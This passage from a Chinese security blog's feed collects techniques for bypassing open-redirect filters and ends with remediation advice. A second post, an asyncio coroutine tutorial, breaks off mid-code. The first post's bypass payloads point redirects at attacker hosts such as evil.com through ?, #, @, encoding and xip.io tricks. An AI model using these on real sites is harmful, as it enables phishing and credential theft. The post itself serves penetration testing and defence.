<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用问号，这是一个特性，利用问号可以成功绕过URL限制</span><br><span class="line">比如：http://www.aaa.com/acb?Url=http://login.aaa.com 这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：http://www.test.com/?login.aaa.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>“#”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com#a.whitelist.com</code></p>
</li>
<li><p>利用白名单缺陷绕过限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有些域名白名单限制不严格。</span><br><span class="line">1. 检测是否是当前域名</span><br><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com在访问后会跳转到login.aaa.com，如果它的白名单显示不严格，将login.aaa.com改成aaa.com同样可以跳转，到这里都是合法的跳转。这时只要构造一个第三方的域名中包含aaa.com的url就可以成功跳转。如果恰好有这样一个域名，恭喜你；如果没有，就需要买一个域名。emmm..在国内这样很亏</span><br><span class="line"></span><br><span class="line">2.域名字符串检测欺骗</span><br><span class="line">http://www.aaa.com/acb?Url=http://login.aaa.com，检测login.aaa.com，直接修改为：http://www.aaa.com/acb?Url=http://login.aaa.com.www.eval.com</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542520860.14.png" alt></p>
</li>
<li><p>利用多重验证&amp;跳转绕过限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">现在的许多网站都有多重验证。例如：在登录账户以后会出现另一个验证，输入手机号进行验证，这时可能存在任意URL跳转的问题。具体如下：</span><br><span class="line">http://www.aaa.com/acb?Url=http:...http://login.aaa.com,这里只需要修改最后的URL来绕过限制</span><br></pre></td></tr></table></figure>
</li>
<li><p>点击触发达到绕过URL跳转的限制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在许多的登录的位置，URL是一个跳转的地址。比如：http://www.aaa.com/acb?Url=http://login.aaa.com;这个时候只要将login.aaa.com修改为任意URL;这时界面没有发生变化，当用户输入账号密码点击登录按钮时会触发跳转。</span><br><span class="line">需要注意的是：这里不一定要输入正确的账号密码进行跳转，有些需要，视具体的站点而定</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用xip.io绕过限制（还可以借鉴其余的SSRF绕过方法）</p>
<p><code>http://www.aaa.com/acb?Url=http://login.aaa.com.eval.com.xip.io</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在SSRF读取内网地址的时候会有许多限制，有时候可以利用xip.io直接绕过限制读取，这里可以引用这个方法，直接将可以跳转的位置的地址后添加为任意url+xip.io，如果可以存在则将跳转的地址解析到后面的恶意url进行跳转。</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用超链接绕过可信站点的限制（可信站多次重定向）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如一个存在URL跳转漏洞的位置，在测试的时候一般都喜欢使用www.baidu.com等知名站点去做第三方跳转，但是现在像baidu.com,qq.com这样的可信站点被许多站点默认加在白名单中，所以以这样可信的站点去跳转它并不能触发URL跳转漏洞（这里是网站的正常逻辑）；而别的方式又绕不过，就可以利用下面这个思路：</span><br><span class="line"></span><br><span class="line">1. baidu.com这个域名已经被加在测试站点的白名单中</span><br><span class="line">2. 任意跳转的URL已经被baidu收录</span><br><span class="line">3. site:xxx(任意跳转的URL)</span><br><span class="line">4. 在百度点击相关的站点的时候回利用百度自身的一个302跳转</span><br><span class="line">5. 将百度自身的这个302跳转作为测试站点热任意URL的参数，绕过白名单baidu.com的限制进行任意URL跳转(注意：百度自身的302跳转太长了，可以使用单向压缩函数进行压缩，前提是测试站点能够解析)</span><br><span class="line"></span><br><span class="line">第二种场景：测试站点的白名单限制的比较严格，只允许加在自己域的地址，这时就需要一个测试站点其他域存在任意URL跳转漏洞，才可能利用成功：</span><br><span class="line">https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=eval.com</span><br><span class="line">总结：其实是利用了两次URL跳转</span><br></pre></td></tr></table></figure>
</li>
<li><p>POST方式的URL跳转</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. post方式下的影响较小，比如在站点的个人信息处存在头像上传，上传正常的头像，抓包将头像地址修改为恶意第三方地址，放行以后图片是不能正常显示的，这个时候如果有后台管理员的审核安全意识不高，去查看这个不显示的图片，触发恶意URL跳转，可以打到后台管理员信息。利用条件比较苛刻。在XSS也有类似的利用场景。</span><br><span class="line"></span><br><span class="line">2.如果在POST方式中数据只URL跳转参数，那就可以尝试将POST请求转换为GET请求，配合上面的绕过方式利用。（前提是测试网站支持GET传参的方式）</span><br></pre></td></tr></table></figure>
</li>
<li><p>HPP参数污染绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=l@lsowl.xyz</span><br><span class="line"></span><br><span class="line">跳转会变成： location:http://https://www.aaa.com/redirect.php?url=https://auth.aaa.com/jump.do?url=@lsowl.xyz</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="畸形地址绕过"><a href="#畸形地址绕过" class="headerlink" title="畸形地址绕过"></a>畸形地址绕过</h3><blockquote>
<p>畸形地址由于web站点采用各种各样的语言以及框架，所以绕过的方式显得很诡异。。。</p>
</blockquote>
<ol>
<li><p>通过添加多余的“/”(%2F),然后对%2F二次URL编码绕过网站对.com的分割</p>
<p><code>https://www.aaa.com/%2Fevil/%252Ecom</code> </p>
</li>
<li><p>通过添加4个“/”前缀和“/..”后缀，突破限制(重复特殊字符绕过)</p>
<p><code>https://www.aaa.com/redirect.php?url=////www.eval.com/..</code></p>
</li>
<li><p>特殊字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;;&quot;, &quot;/&quot;, &quot;\&quot;, &quot;?&quot;, &quot;:&quot;, &quot;@&quot;, &quot;=&quot;, &quot;&amp;&quot;, &quot;.&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>协议型网站的实例</p>
<p><code>http://user:pass@testweb.com/path/;help.php?q=abc#lastpage</code></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542522531.03.png" alt></p>
</li>
</ol>
<h3 id="其他绕过思路"><a href="#其他绕过思路" class="headerlink" title="其他绕过思路"></a>其他绕过思路</h3><ol>
<li>跳转参数是IP，而不是域名</li>
<li>跳转到IPV6地址，不是IPV4地址</li>
<li>将要跳转的IP地址用10进制，8进制，16进制表示</li>
<li>更换协议，使用FTP,gopher</li>
<li>CRLF注入不能XSS时，转向利用任意URL跳转漏洞</li>
</ol>
<h3 id="IP地址计算补充（以本地ping百度返回的IP为例）"><a href="#IP地址计算补充（以本地ping百度返回的IP为例）" class="headerlink" title="IP地址计算补充（以本地ping百度返回的IP为例）"></a>IP地址计算补充（以本地ping百度返回的IP为例）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995163.32.png" alt></h3><h4 id="第一种计算方法（将点分十进制转换为32位二进制）"><a href="#第一种计算方法（将点分十进制转换为32位二进制）" class="headerlink" title="第一种计算方法（将点分十进制转换为32位二进制）"></a>第一种计算方法（将点分十进制转换为32位二进制）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995526.11.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995608.55.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995618.84.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550995629.62.png" alt></h4><h4 id="第二种计算方法"><a href="#第二种计算方法" class="headerlink" title="第二种计算方法"></a>第二种计算方法</h4><p>111 <em> 256 </em> 256 <em> 256 + 13</em> 256 <em> 256 + 100 </em> 256 +92*1 = 1863148636（十进制）</p>
<h4 id="第三种计算方法（利用mysql中的inet-aton函数）"><a href="#第三种计算方法（利用mysql中的inet-aton函数）" class="headerlink" title="第三种计算方法（利用mysql中的inet_aton函数）"></a>第三种计算方法（利用mysql中的inet_aton函数）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1550996163.52.png" alt></h4><h3 id="半自动化测试"><a href="#半自动化测试" class="headerlink" title="半自动化测试"></a>半自动化测试</h3><ul>
<li>开源的payload地址：<a href="https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt" target="_blank" rel="noopener">https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt</a></li>
</ul>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ol>
<li>referer限制<ul>
<li>确定传递URL参数的引入来源，保证URL的有效性，避免恶意用户自己生成的链接(这里要注意的是，在有些特殊的环境下，URL跳转会带着HTTP referer头，这样就会使得依赖referer头验证的方式失效)</li>
</ul>
</li>
<li>进行token验证<ul>
<li>保证所有的链接是可信域中的，加入用户不可控的token在服务端进行验证，防止恶意跳转</li>
</ul>
</li>
<li>服务端做好域名白名单或跳转白名单，只对合法的URL进行跳转（常用）</li>
<li>对请求参数做加密和签名，防止参数被篡改，服务端要能合法正确的解析URL（不常用，多应用在跳转的URL是由后台生产，不是用户在前台输入）</li>
</ol>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.anquanke.com/post/id/94377" target="_blank" rel="noopener">https://www.anquanke.com/post/id/94377</a></p>
<p><a href="https://blog.csdn.net/change518/article/details/54286473" target="_blank" rel="noopener">https://blog.csdn.net/change518/article/details/54286473</a></p>
<p><a href="https://blog.csdn.net/xyx107/article/details/82941842" target="_blank" rel="noopener">https://blog.csdn.net/xyx107/article/details/82941842</a></p>
<p><a href="https://blog.csdn.net/change518/article/details/53997509" target="_blank" rel="noopener">https://blog.csdn.net/change518/article/details/53997509</a></p>
<p><a href="http://www.admintony.com/redict-bypass.html#more" target="_blank" rel="noopener">http://www.admintony.com/redict-bypass.html#more</a></p>
<p><a href="http://www.luteam.com/?p=211#more-211" target="_blank" rel="noopener">http://www.luteam.com/?p=211#more-211</a> [关于IP计算]</p>
<p><a href="http://byd.dropsec.xyz/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</a> [关于SSRF绕过]</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>URL跳转</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>python协程学习</title>
    <url>/2018/11/09/python%E5%8D%8F%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h3 id="python学习总结"><a href="#python学习总结" class="headerlink" title="python学习总结"></a>python学习总结</h3><blockquote>
<p>在编写程序处理一些任务时为了提高效率，我们的程序会从单一的串行运行的方式向多线程或者多进程的方式来转变，这里学习总结通过python协程来提高程序运行的效率。多进程适合于CPU密集型的程序（各种循环处理，计数等等），多线程适合I/O密集型的程序（如文件的读取，网络爬虫等），但是由于python的GIL(全局解释器锁)的存在，I/O密集型的程序，效率并没有很大的提升，尤其是python在多CPU中多线程的应用（原因是单核下多线程，每次释放GIL，唤醒的那个线程都能获取到GIL锁，所以能够无缝执行，但多核下，CPU0释放GIL后，其他CPU上的线程都会进行竞争，但GIL可能会马上又被CPU0拿到，导致其他几个CPU上被唤醒后的线程会醒着等待到切换时间后又进入待调度状态，这样会造成线程颠簸(thrashing)，导致效率更低），所以python对于I/O密集型的任务使用协程可以有效的提升效率。</p>
</blockquote>
<h3 id="相关知识总结"><a href="#相关知识总结" class="headerlink" title="相关知识总结"></a>相关知识总结</h3><h4 id="为什么python多线程比较鸡肋"><a href="#为什么python多线程比较鸡肋" class="headerlink" title="为什么python多线程比较鸡肋"></a>为什么python多线程比较鸡肋</h4><ol>
<li>在python多线程下，每个线程的执行方式：<ul>
<li>获取GIL</li>
<li>执行代码直到sleep或者是python虚拟机将其挂起</li>
<li>释放GIL</li>
</ul>
</li>
<li>可见，某个线程想要执行，必须先拿到GIL，我们可以把GIL看作是“通行证”，并且在一个python进程中，GIL只有一个。拿不到通行证的线程，就不允许进入CPU执行。</li>
<li>每次释放GIL锁，线程进行锁竞争、切换线程，会消耗资源。并且由于GIL锁存在，python里一个进程永远只能同时执行一个线程(拿到GIL的线程才能执行)</li>
</ol>
<h4 id="多进程是什么，为什么不会像python多线程那样"><a href="#多进程是什么，为什么不会像python多线程那样" class="headerlink" title="多进程是什么，为什么不会像python多线程那样"></a>多进程是什么，为什么不会像python多线程那样</h4><ol>
<li>多进程就是利用 CPU 的多核优势，在同一时间并行地执行多个任务，可以大大提高执行效率。</li>
<li>每个进程有各自独立的GIL，互不干扰，这样就可以真正意义上的并行执行，所以在python中，多进程的执行效率优于多线程(仅仅针对多核CPU而言)</li>
<li>python在多核CPU下做并行的效率提升，通用的就是使用多进程，可以有效的提高并行效率</li>
</ol>
<h4 id="什么是阻塞"><a href="#什么是阻塞" class="headerlink" title="什么是阻塞"></a>什么是阻塞</h4><ol>
<li>阻塞状态指陈程序未得到所需要的计算资源时暂时被挂起的，程序在等待某个操作完成的期间无法进行别的操作的状态。</li>
<li>常见的阻塞形式有：网络 I/O 阻塞、磁盘 I/O 阻塞、用户输入阻塞等。阻塞是无处不在的，包括 CPU 切换上下文时，所有的进程都无法真正干事情，它们也会被阻塞。如果是多核 CPU 则正在执行上下文切换操作的核不可被利用。</li>
</ol>
<h4 id="什么是非阻塞"><a href="#什么是非阻塞" class="headerlink" title="什么是非阻塞"></a>什么是非阻塞</h4><ol>
<li>非阻塞状态指在程序等待某个操作的过程中自身不被阻塞，可以继续进行其他的操作。</li>
<li>非阻塞并不是在任何程序级别、任何情况下都可以存在的。仅当程序封装的级别可以囊括独立的子程序单元时，它才可能存在非阻塞状态。</li>
</ol>
<h4 id="什么是同步"><a href="#什么是同步" class="headerlink" title="什么是同步"></a>什么是同步</h4><ol>
<li>不同的程序在完成某个任务，在执行过程中需要靠某种通信方式协调一致的模式</li>
<li>同步意味着有序</li>
</ol>
<h4 id="什么时异步"><a href="#什么时异步" class="headerlink" title="什么时异步"></a>什么时异步</h4><ol>
<li>不同的程序在完成某个任务，在执行过程中无需通信协调完成任务，不相关的程序单元之间可以是异步的。</li>
<li>异步意味着无序</li>
</ol>
<h4 id="什么是协程"><a href="#什么是协程" class="headerlink" title="什么是协程"></a>什么是协程</h4><ol>
<li>协程，英文叫做 Coroutine，又称微线程，纤程，协程是一种用户态的轻量级线程</li>
<li>协程自身拥有寄存器上下文和栈。协程在调度切换时，将寄存器和栈保存到其他地方，在切换上下文时恢复到原来保存的寄存器上下文和栈。协程可以保存上一次调用的状态，在每次过程的重载时就是进入了上一次调用的状态。</li>
<li>协程本质上是个单进程，协程相对于多进程来说，无需线程上下文切换的开销，无需原子操作锁定及同步的开销，编程模型也非常简单。结合上面来看，除去python的GIL全局解释器锁的问题，协程的上下文切换是在一个进程中不用跨进程，这种模式就决定了它的高效性。</li>
<li>使用协程来实现异步操作，比如在网络爬虫场景下，当一个请求发出后如果有超时的情况，这个时候就不需要一直等待，在这段时间内程序还可以处理许多任务，在请求响应以后切换回来处理，这样可以极大的提升对CPU的利用率，异步协程可以极大的提升我们处理I/O密集型任务的效率。</li>
</ol>
<h3 id="python异步协程的用法"><a href="#python异步协程的用法" class="headerlink" title="python异步协程的用法"></a>python异步协程的用法</h3><blockquote>
<p>python从3.4版本开始引入了协程的概念，是以生成器对象为基础，操作比较繁琐麻烦，在3.5版本引入了在 async/await，是的协程的操作更加简单。这里学习使用python协程中最常用的库 asyncio，这种协程也是基于生成器的，还有一种Gevent，Gevent需要许多第三方库支持。得确保项目中用到其他用到的网络库也必须使用纯Python或者明确说明支持Gevent，由于Gevent直接修改标准库里面大部分的阻塞式系统调用，可能会出现意想不到的问题，所以用asyncio来实现异步协程。</p>
</blockquote>
<h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><ol>
<li>event_loop：事件循环，相当于一个无限循环，我们可以把一些函数注册到这个事件循环上，当满足条件发生的时候，就会调用对应的处理方法。（这里可以理解为一个监听机制）</li>
<li>coroutine：中文翻译叫协程，在 Python 中常指代为协程对象类型，我们可以将协程对象注册到时间循环中，它会被事件循环调用。我们可以使用 async 关键字来定义一个方法，这个方法在调用时不会立即被执行，而是返回一个协程对象。（方便开发者自己调控）</li>
<li>task：任务，它是对协程对象的进一步封装，包含了任务的各个状态。</li>
<li>future：代表将来执行或没有执行的任务的结果，实际上和 task 没有本质区别</li>
<li>async/await 关键字，它是从 Python 3.5 才出现的，专门用于定义协程。其中，async 定义一个协程，await 用来挂起阻塞方法的执行。</li>
</ol>
<h4 id="定义协程"><a href="#定义协程" class="headerlink" title="定义协程"></a>定义协程</h4><ol>
<li><p>只注入简单的coroutine协程对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span>               <span class="comment">#定义一个协程,async定义的协程返回的是一个coroutine协程对象</span></span><br><span class="line">    print(<span class="string">'Number: '</span>,x)</span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine: '</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()     <span class="comment">#创建事件循环loop</span></span><br><span class="line">loop.run_until_complete(coroutine)  <span class="comment">#调用了 loop 对象的 run_until_complete() 方法将协程注册到事件循环 loop中，然后启动</span></span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Coroutine:  &lt;coroutine object execute at <span class="number">0x000001C08233BEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Number:  <span class="number">1</span></span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure>
</li>
<li><p>将 coroutine 对象的进一步封装为task对象，它比 coroutine 对象多了运行状态，比如 running、finished 等，可以用这些状态来获取协程对象的执行情况。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span>  <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">'Number:'</span>,x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"> </span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine:'</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">task = loop.create_task(coroutine)  <span class="comment">#调用loop.create_task将async定义返回的coroutine对象进一步分装</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">loop.run_until_complete(task)       <span class="comment">#调用了loop对象的run_until_complete()方法将协程注册到事件循环 loop中，然后启动</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：这里可以看到task对象的状态</span></span><br><span class="line">Coroutine: &lt;coroutine object execute at <span class="number">0x00000259A21EAEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Task: &lt;Task pending coro=&lt;execute() running at D:/python/实战项目/Coroutie2.py:<span class="number">3</span>&gt;&gt;</span><br><span class="line">Number: <span class="number">1</span></span><br><span class="line">Task: &lt;Task finished coro=&lt;execute() done, defined at D:/python/实战项目/Coroutie2.py:<span class="number">3</span>&gt; result=<span class="number">1</span>&gt;</span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure>
</li>
<li><p>不借助loop的create_task方法进一步封装task对象，通过asyncio 的 ensure_future() 方法直接定义task对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">execute</span><span class="params">(x)</span>:</span></span><br><span class="line">    print(<span class="string">'Number:'</span>,x)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"> </span><br><span class="line">coroutine = execute(<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'Coroutine:'</span>,coroutine)</span><br><span class="line">print(<span class="string">'After calling execute'</span>)</span><br><span class="line"> </span><br><span class="line">task = asyncio.ensure_future(coroutine)   <span class="comment">#直接定义task对象</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task'</span>,task)</span><br><span class="line">print(<span class="string">'After calling loop'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：和通过loop.create_task封装的结果一样</span></span><br><span class="line">Coroutine: &lt;coroutine object execute at <span class="number">0x000002C99E56AEB8</span>&gt;</span><br><span class="line">After calling execute</span><br><span class="line">Task: &lt;Task pending coro=&lt;execute() running at D:/python/实战项目/Coroutine3.py:<span class="number">3</span>&gt;&gt;</span><br><span class="line">Number: <span class="number">1</span></span><br><span class="line">Task &lt;Task finished coro=&lt;execute() done, defined at D:/python/实战项目/Coroutine3.py:<span class="number">3</span>&gt; result=<span class="number">1</span>&gt;</span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="绑定回调"><a href="#绑定回调" class="headerlink" title="绑定回调"></a>绑定回调</h4><ol>
<li><p>通过调用 add_done_callback() 为task对象绑定一个回调方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span>  <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(task)</span>:</span></span><br><span class="line">    print(<span class="string">'Status:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line">coroutine = Request()</span><br><span class="line">task = asyncio.ensure_future(coroutine)</span><br><span class="line">task.add_done_callback(callback)   <span class="comment">#绑定回调函数</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Task: &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Status: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task: &lt;Task finished coro=&lt;Request() done, defined at D:/python/实战项目/Coroutine4.py:<span class="number">4</span>&gt; result=&lt;Response [<span class="number">200</span>]&gt;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>不用回调方法，直接在 task 运行完毕之后也可以直接调用 result() 方法获取结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line">coroutline  = Request()</span><br><span class="line">task = asyncio.ensure_future(coroutline)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">print(<span class="string">'Task Result:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Task: &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Status: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task: &lt;Task finished coro=&lt;Request() done, defined at D:/python/实战项目/Coroutine4.py:<span class="number">4</span>&gt; result=&lt;Response [<span class="number">200</span>]&gt;&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="多任务协程（通过task列表来实现，调用asncio-wait-方法执行）"><a href="#多任务协程（通过task列表来实现，调用asncio-wait-方法执行）" class="headerlink" title="多任务协程（通过task列表来实现，调用asncio.wait()方法执行）"></a>多任务协程（通过task列表来实现，调用asncio.wait()方法执行）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]  <span class="comment">#利用for循环创建5个task</span></span><br><span class="line">print(<span class="string">'Tasks:'</span>,tasks)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))   <span class="comment">#asyncio.wait(tasks)将task列表注入到loop循环事件中</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">    print(<span class="string">'Task Request:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Tasks: [&lt;Task pending coro=&lt;Request() running at D:/python/实战项目/Coroutine6.py:<span class="number">4</span>&gt;&gt;, &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure>
<h4 id="协程实现"><a href="#协程实现" class="headerlink" title="协程实现"></a>协程实现</h4><blockquote>
<p>以上是对协程基本的定义使用，并没有进行异步处理的操作，这里用flask模拟网络请求有延迟的情况，然后进行挂起，异步的操作。</p>
</blockquote>
<ol>
<li><p>利用flask编写模拟有网络延迟的服务器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)      <span class="comment">#表示请求这个接口要延时3秒显示结果，模拟延迟的网络</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello!'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(threaded = <span class="keyword">True</span>)  <span class="comment">#threaded = True表示在服务器开启了多线程模式，如果不开启，服务端是单线程模式，如果还是异步I/O请求的方式，依旧要排队等待依次执行。</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1541731526.07.png" alt></p>
</li>
<li><p>通过协程的方式来请求生成的模拟服务端页面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost 